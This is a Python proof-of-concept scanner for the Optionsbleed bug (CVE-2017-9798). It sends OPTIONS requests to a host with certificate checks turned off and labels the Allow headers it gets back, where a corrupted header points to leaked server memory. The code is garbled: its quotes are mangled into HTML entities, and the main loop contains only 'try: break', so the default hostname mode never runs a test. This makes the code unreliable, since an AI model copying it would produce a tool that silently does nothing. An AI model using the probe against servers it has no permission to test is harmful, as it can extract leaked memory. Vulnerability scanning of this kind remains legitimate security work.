 
# Optionsbleed proof of concept test
# by Hanno BÃ¶ck
 
import argparse
import urllib3
import re
 
 
def test_bleed(url, args):
    r = pool.request(&#039;OPTIONS&#039;, url)
    try:
        allow = str(r.headers["Allow"])
    except KeyError:
        return False
    if allow in dup:
        return
    dup.append(allow)
    if allow == "":
        print("[empty] %s" % (url))
    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$", allow):
        z = [x.strip() for x in allow.split(&#039;,&#039;)]
        if len(z) > len(set(z)):
            print("[duplicates] %s: %s" % (url, repr(allow)))
        elif args.all:
            print("[ok] %s: %s" % (url, repr(allow)))
    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$", allow):
        print("[spaces] %s: %s" % (url, repr(allow)))
    else:
        print("[bleed] %s: %s" % (url, repr(allow)))
    return True
 
 
parser = argparse.ArgumentParser(
         description=&#039;Check for the Optionsbleed vulnerability (CVE-2017-9798).&#039;,
         epilog="Tests server for Optionsbleed bug and other bugs in the allow header.\n\n"
         "Autmatically checks http://, https://, http://www. and https://www. -\n"
         "except if you pass -u/--url (which means by default we check 40 times.)\n\n"
         "Explanation of results:\n"
         "[bleed] corrupted header found, vulnerable\n"
         "[empty] empty allow header, does not make sense\n"
         "[spaces] space-separated method list (should be comma-separated)\n"
         "[duplicates] duplicates in list (may be apache bug 61207)\n"
         "[ok] normal list found (only shown with -a/--all)\n",
         formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument(&#039;hosttocheck&#039;,  action=&#039;store&#039;,
                    help=&#039;The hostname you want to test against&#039;)
parser.add_argument(&#039;-n&#039;, nargs=1, type=int, default=[10],
                    help=&#039;number of tests (default 10)&#039;)
parser.add_argument("-a", "--all", action="store_true",
                    help="show headers from hosts without problems")
parser.add_argument("-u", "--url", action=&#039;store_true&#039;,
                    help="pass URL instead of hostname")
args = parser.parse_args()
howoften = int(args.n[0])
 
dup = []
 
# Note: This disables warnings about the lack of certificate verification.
# Usually this is a bad idea, but for this tool we want to find vulnerabilities
# even if they are shipped with invalid certificates.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
pool = urllib3.PoolManager(10, cert_reqs=&#039;CERT_NONE&#039;)
 
if args.url:
    test_bleed(args.hosttocheck, args)
else:
        for i in range(howoften):
            try:
                    break
            except Exception as e:
                pass

